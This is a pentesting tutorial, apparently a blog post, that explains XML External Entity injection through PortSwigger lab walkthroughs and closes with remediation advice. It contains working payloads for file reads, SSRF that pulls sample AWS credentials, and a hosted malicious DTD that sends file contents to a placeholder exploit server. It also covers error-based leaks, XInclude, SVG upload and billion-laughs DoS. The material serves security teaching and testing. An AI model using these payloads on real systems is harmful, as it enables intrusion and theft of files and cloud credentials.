---
date: 2026-09-23
title: "XXE Explained"
categories: ["Web App Pentesting"]
tags: ["XXE", "Web", "SSRF", "PortSwigger", "OOB"]
author: "Corey Farley"
summary: "A full breakdown of XML External Entity (XXE) injection — what it is, the XML internals that make it possible, where the attack surface hides, and every major exploitation path from basic in-band file reads to blind out-of-band exfiltration via malicious external DTDs, SSRF against cloud metadata, error-based leaks, XInclude, and SVG file upload vectors."
showToc: true
---

XXE (XML External Entity injection) is one of those bugs that looks intimidating the first time you see a stacked parameter-entity payload, but it's really just abuse of a legitimate XML feature that almost nobody needs. Once you understand how XML entities actually resolve, every variant — in-band, blind, out-of-band, error-based — is the same core trick wearing a different hat.

This article walks through what XXE is, the XML internals behind it, where it shows up, and each of the main exploitation paths using the PortSwigger Web Security Academy labs as worked examples. If you just want payloads, the table of contents will get you there, but I'd read the entity section first because it's what makes everything else click.

## What is XXE?

XML External Entity injection is a vulnerability that lets an attacker interfere with an application's processing of XML data. It happens when an app parses XML input and the underlying parser is configured (usually by default) to resolve **external entities** — references that pull in content from outside the document, including local files and network URLs.

When that's the case, you can:

- Read arbitrary files off the server's filesystem
- Force the server to make requests to internal systems (SSRF)
- Exfiltrate data blindly when nothing is reflected back
- In some parsers, trigger denial of service

The root cause is almost always a parser that was never hardened. The XML spec supports external entities, most language libraries enable them out of the box (or historically did), and developers rarely turn them off because they don't know the feature exists.

## The XML background you actually need

To exploit XXE reliably you need to understand three things: the DTD, entities, and the difference between the entity types.

### DTD (Document Type Definition)

A DTD declares the structure and legal building blocks of an XML document. It lives inside a `DOCTYPE` element and this is where entities get defined. For XXE, the `DOCTYPE` is the thing we're injecting or modifying:

```xml
<!DOCTYPE stockCheck [ <!-- entity definitions go here --> ]>
```

### Entities

An entity is basically an XML variable. You define it once and reference it with `&name;`, and the parser substitutes the value wherever the reference appears. There are three flavors that matter to us.

**Internal (general) entities** — value is defined inline:

```xml
<!DOCTYPE foo [ <!ENTITY myEntity "hello world"> ]>
```

Referenced in the document body with `&myEntity;`.

**External (general) entities** — value is pulled from an external source via `SYSTEM` and a URL. This is the vulnerable feature:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Referenced with `&xxe;`. When the parser hits the reference, it fetches `file:///etc/passwd` and substitutes the contents.

**Parameter entities** — a special kind of entity used *inside the DTD itself*. They use a `%` prefix on both definition and reference:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
```

Parameter entities are the workhorse for blind XXE. When an app blocks regular entities, parameter entities frequently still resolve, and they're the only way to do the recursive DTD tricks needed for out-of-band exfiltration.

The single most useful thing to internalize: `&entity;` is referenced in the **document body**, `%entity;` is referenced in the **DTD**. Mixing those up is the number one reason payloads silently fail.

## When and where XXE appears

The obvious tell is a request with an XML body and `Content-Type: application/xml` (or `text/xml`). Any time you see XML going to the server, you should immediately be asking whether the parser resolves external entities.

But XML hides in a lot of places that don't announce themselves:

- **SOAP APIs** and legacy web services
- **File uploads** for formats that are XML under the hood — SVG, DOCX, XLSX, PPTX, and other Office formats, RSS/Atom feeds, GPX, KML
- **SAML** authentication requests and responses
- **REST endpoints** that *also* accept XML even though the front end only ever sends JSON — flip the `Content-Type` to `application/xml`, rewrite the body, and see if the backend takes it
- **Server-side XML generation**, where your input is inserted into a document the server builds. You can't control the `DOCTYPE` here, which is exactly what XInclude is for (covered later)

The mindset that pays off: don't just look for XML request bodies, look for anything that might be *parsed* as XML somewhere downstream.

## Impact

The two headline impacts are **arbitrary file read** and **SSRF**. File read gets you `/etc/passwd`, config files, source code, private keys, and credentials. SSRF turns the server into a proxy into the internal network — and against cloud instances, straight at the metadata endpoint for temporary credentials. Blind variants extend both of these to situations where the app shows you nothing. Some parsers are also vulnerable to entity-expansion DoS.

---

## Retrieving files with external entities

This is the canonical in-band case: the app parses XML, reflects a value back, and the parser resolves external entities. **PortSwigger Lab: Exploiting XXE using external entities to retrieve files.**

First capture the `Check stock` request to see what the feature sends:

```http
POST /product/stock HTTP/2
Host: 0ad5005103f9a1f3869db2730013004e.web-security-academy.net
Content-Type: application/xml
...

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

The response just reflects the stock number:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 2

41
```

An XML body that gets parsed and partially reflected is the ideal setup. Define an external entity pointing at `/etc/passwd` and reference it in the `productId` field, since that value comes back in the response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

The parser substitutes `&xxe;` with the file contents, the app tries to look up that "product ID," fails, and echoes the whole file back in the error. Done.

The key placement detail: the entity reference has to land in a value the application actually returns. Here that's `productId`, because its value is what shows up in the response (as a stock count or an error). Drop it in a field that never gets reflected and you'll read the file into the void.

### Bypassing filters with the PHP filter wrapper

If there's input validation or the file contents break XML parsing (special characters, etc.), base64-encoding the file through PHP's filter wrapper often sails through. Only works on PHP backends:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

You get a clean base64 blob back that survives the round trip, then decode it locally. This is also handy for pulling source files that contain characters the parser would otherwise choke on.

---

## XXE to SSRF

Beyond file reads, the other major impact is server-side request forgery. Instead of pointing the external entity at a file, point it at a URL — the server makes the request for you. **PortSwigger Lab: Exploiting XXE to perform SSRF attacks.**

Same `Check stock` feature, same XML body. This time the entity targets the cloud metadata IP:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

The response leaks the next path segment through the error message:

```http
HTTP/2 400 Bad Request
Content-Length: 28

"Invalid product ID: latest"
```

Because it's reflected, you can walk the metadata tree one hop at a time. Append `/latest`, read the next segment, append that, and so on:

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```

```http
"Invalid product ID: meta-data"
```

Keep following the trail until you reach the IAM credentials:

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

And you get the temporary AWS keys:

```http
HTTP/2 400 Bad Request
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "AccessKeyId" : "DpDayrzvDrlZlNLZD4Y7",
  "SecretAccessKey" : "7vbN7R4h4qd5OZtaEM3i5R4yONEMNr4lRL2Fs3qs",
  "Token" : "KRrAULOeKfV5w1ZZbLVgWnG1V7bmbOoiyNc3q5wf...",
  "Expiration" : "2032-09-04T20:46:12Z"
}"
```

`http://169.254.169.254/latest/meta-data/iam/security-credentials/` is the default AWS link-local metadata path (IMDSv1) and it's always the high-value target when you land SSRF against something running in AWS. Grab the role name from that directory, then request it to pull the STS credentials. On engagements this is often the difference between "SSRF, informational" and "full cloud account compromise."

---

## Blind XXE — out-of-band via parameter entities

Real targets rarely reflect anything. **Blind XXE** is when the parser resolves entities but no output comes back, so you prove and then exploit the bug out-of-band (OOB). **PortSwigger Lab: Blind XXE with out-of-band interaction via XML parameter entities.**

Find the XML `POST` and first test whether regular entities are even allowed:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com"> ]>
<stockCheck>
    <productId>2</productId>
    <storeId>&xxe;</storeId>
</stockCheck>
```

Blocked:

```http
HTTP/2 400 Bad Request
Content-Length: 47

"Entities are not allowed for security reasons"
```

Lots of apps blacklist regular (general) external entities specifically. Parameter entities frequently slip past that filter because the check only looks for `<!ENTITY name` and not `<!ENTITY % name`. Switch to a parameter entity and reference it inside the DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

The response is a parsing error:

```http
HTTP/2 400 Bad Request
Content-Length: 19

"XML parsing error"
```

Don't let the error fool you — the parser resolved `%xxe;` *before* it errored out, which means it already fired the request. Poll Collaborator and you'll see the DNS lookup and HTTP hit. That interaction is proof the entity resolved, which is the whole objective for this lab and the foundation for actually exfiltrating data next.

---

## Blind XXE — exfiltration via a malicious external DTD

Proving OOB interaction is nice, but the goal is data. When the app is blind, you can't reference a file entity and read the result inline — and worse, XML forbids referencing a parameter entity from *within another entity's value* in the internal subset. The workaround is to host your own DTD on an external server where those restrictions don't apply. **PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD.**

Same filter behavior as before — regular entities are blocked, parameter entities trigger a parsing error but still beacon out. So we host a malicious DTD on the exploit server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-EXPLOIT-SERVER.net/?contents=%file;'>">
%stack;
%exfil;
```

Breaking down what this does, because this is the payload people copy-paste without understanding:

- `%file` reads the target file (`/etc/hostname`) into a parameter entity.
- `%stack` defines a *second* entity, `%exfil`, whose value is a URL with the file contents appended as a query parameter. The `&#x25;` is a URL/XML-encoded `%` — it has to be encoded so the inner `<!ENTITY` definition isn't evaluated until `%stack` is expanded.
- `%stack;` expands, which *declares* `%exfil`.
- `%exfil;` expands, which fetches the URL — carrying `/etc/hostname`'s contents to your server.

Then the actual request just loads your hosted DTD via a parameter entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % loadDtd SYSTEM "https://YOUR-EXPLOIT-SERVER.net/exploit">
%loadDtd;
]>
<stockCheck>
    <productId>2</productId>
    <storeId>2</storeId>
</stockCheck>
```

You'll get a parsing error again, but check the exploit server logs and the file walked right out:

```
10.0.3.72  "GET /?contents=74f8e6af88c4 HTTP/1.1" 200 "User-Agent: Java/21.0.1"
```

The `Java/21.0.1` user agent is a nice tell that the backend parser is Java-based. The reason this is hosted externally at all: the recursive entity nesting that builds the exfil URL is illegal inside the request's internal DTD subset, but perfectly legal inside an external DTD. That constraint is *the* reason blind exfil requires a hosted DTD.

---

## Blind XXE — error-based exfiltration

Sometimes OOB is blocked entirely — egress filtering, no outbound DNS, whatever. If the app returns parser error messages, you can smuggle file contents out through a deliberately malformed error. This one isn't in most people's default toolkit but it's saved me when outbound was locked down.

Host a DTD that reads the file, then references it inside a path that's guaranteed not to exist:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

When `%error;` resolves, the parser tries to open `file:///nonexistent/<contents of /etc/passwd>`, fails, and dumps the failed path — file contents and all — into the error response:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Load it the same way as the exfil DTD (`%loadDtd;` pointing at your hosted file). No outbound data channel needed beyond loading the DTD itself — and if even *that's* blocked, the local DTD repurposing trick below can get you there with zero outbound.

---

## XXE via file upload (SVG)

This is the vector people miss most often, and it's where the "XML hides in file formats" point pays off. If an app accepts image uploads and the processing library handles SVG, you have XXE surface even though nothing about the request looks like XML. SVG *is* XML.

Capture a normal upload — here it's an avatar on a comment form, sent as `multipart/form-data` with a benign SVG:

```http
POST /post/comment HTTP/2
Host: 0a4f00b603a185a68374233000170062.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryryrAtUBKYAACV1R9
...

------WebKitFormBoundaryryrAtUBKYAACV1R9
Content-Disposition: form-data; name="avatar"; filename="red.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" fill="red"/></svg>
------WebKitFormBoundaryryrAtUBKYAACV1R9
```

The transport is `multipart/form-data`, not XML — but the SVG payload itself is XML, and the server-side image library parses it as such when it processes the upload. That's the attack surface. Swap the benign SVG for a malicious one with an XXE entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="10" y="50">&xxe;</text>
</svg>
```

The `&xxe;` reference sits inside a `<text>` element so the file contents get rendered into the image. Upload it, then open the stored avatar directly (right-click → open in new tab on the rendered image) and `/etc/passwd` is rendered right into the picture.

Whenever you see an upload field, ask what format the processing library actually supports versus what the front end claims to want. An app that "only accepts PNG/JPEG" will still happily hand an SVG to a library that parses it as XML.

---

## A few more variants worth knowing

These didn't each get their own lab in my notes, but you'll run into them and they're worth having in the back pocket.

### XXE via Content-Type conversion

An endpoint that normally takes `application/x-www-form-urlencoded` or JSON may still parse XML if you ask it to. Change the `Content-Type` to `application/xml` and rewrite the body as an XML document with your entity. Backends built on frameworks that auto-detect the body format are the usual candidates. Always worth a five-second test on any parameter-driven endpoint.

### XInclude

When your input is inserted into a server-side XML document you don't control, you can't declare a `DOCTYPE` or define entities — so classic XXE is out. XInclude is the answer. It's an XML feature for building a document from sub-documents, and it can be triggered from a single controlled data value:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Drop that into the parameter that gets embedded server-side. If XInclude is enabled, the parser pulls in the file. This is common against endpoints that take a value, wrap it in an XML template, and forward it to an internal SOAP service.

### Local DTD repurposing

If OOB is fully blocked (no outbound at all, so you can't even host a DTD), you can still do error-based exfil by hijacking a DTD file that already exists locally on the server. You redefine one of its internal parameter entities to trigger the error-based leak. GNOME desktops ship `/usr/share/yelp/dtd/docbookx.dtd`, which is a reliable one on Linux, but you're looking for any local `.dtd` you can enumerate. It's fiddly and parser-version-specific, but it's the move when there's genuinely zero egress.

### Entity expansion DoS (billion laughs)

Historical but still relevant against unhardened parsers. Nested entities expand exponentially and blow up memory:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
```

Only throw this at something you're allowed to knock over. On a real engagement I'd note the vector and confirm entity expansion is unrestricted rather than actually detonating it in production.

---

## Finding XXE — the quick methodology

1. Spot XML surface: XML request bodies, `Content-Type: application/xml`/`text/xml`, SOAP, SAML, file uploads (SVG/Office/feeds), and endpoints you can coerce into XML via the `Content-Type`.
2. Test in-band file read first — `file:///etc/passwd` referenced in a **reflected** field. Fastest win when it's there.
3. If entities are blocked, switch to **parameter entities** and confirm OOB interaction with Collaborator.
4. If OOB fires but nothing's reflected, host a **malicious external DTD** to exfiltrate.
5. If OOB is blocked but errors leak, go **error-based**; if there's no egress at all, **repurpose a local DTD**.
6. Always try SSRF against `169.254.169.254` when the target's in the cloud.
7. Can't control the `DOCTYPE`? Reach for **XInclude**.

## Remediation

The fix is almost always one line of parser configuration: **disable DTDs (external entities and doctype declarations) entirely**. Nearly no application legitimately needs them, and turning them off kills the entire vulnerability class — file read, SSRF, blind exfil, and DoS all at once. If DTDs genuinely can't be disabled, disable external entity resolution and external DTD loading specifically. Beyond that: don't parse untrusted XML with a default-configured parser, keep XML libraries patched, and don't forget that "we only accept images" still means an SVG can reach an XML parser.

The exact knob varies by language — `libxml_disable_entity_loader` (older PHP), `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` on Java's `DocumentBuilderFactory`, `defusedxml` for Python, and so on — but the principle is identical everywhere.

## Lessons learned

XXE rewarded me for slowing down and understanding the entity mechanics instead of pattern-matching payloads. The `&` vs `%` distinction, and *why* blind exfil has to be hosted externally, are the two things that turn this from "copy the PortSwigger payload and hope" into something you can adapt on the fly when a target behaves slightly differently than the lab.

The vectors I want to keep front of mind going forward are the non-obvious ones: SVG and Office file uploads, and flipping `Content-Type` to `application/xml` on JSON endpoints. Those are the XXE findings that survive on modern targets, because the blatant "XML body reflects a value" case is getting rarer while the "developer forgot the image library parses SVG as XML" case is very much alive.